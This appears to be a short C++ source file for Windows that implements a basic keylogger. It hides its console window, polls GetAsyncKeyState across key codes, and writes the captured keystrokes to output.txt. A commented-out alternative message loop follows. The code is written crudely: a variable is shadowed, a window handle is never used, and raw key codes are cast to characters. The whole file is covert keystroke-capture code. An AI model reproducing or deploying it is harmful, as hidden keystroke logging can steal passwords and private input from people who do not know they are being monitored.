#include <iostream>
#include <windows.h>
#include <fstream>

using namespace std;



int main()
{
    string outfile = "output.txt";
    ofstream output;
    output.open(outfile);
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    HWND handle = GetActiveWindow();

    char KEY = 'x';
    int i = 0;
	while (i<5) {
		for (int KEY = 8; KEY <= 190; KEY++)
		{
			if (GetAsyncKeyState(KEY) == -32767) {
                output << char(KEY);
                i++;
				}
			}
		}
        output.close();
        cout << "DONE!" << endl;
        return 0;
}


    // MSG msg;

    // while(GetMessage(&msg, handle, 0, 0)){
    //     output << "HERE\n";
    //     switch(msg.message){
    //         case WM_KEYDOWN:
    //         WPARAM key = msg.wParam;
    //         switch(key){
    //             case VK_DELETE:
    //                 cout << "Delete Pressed" << endl;
    //                 return 0;
    //             break;
    //         }
            
            
    //     }
    // }

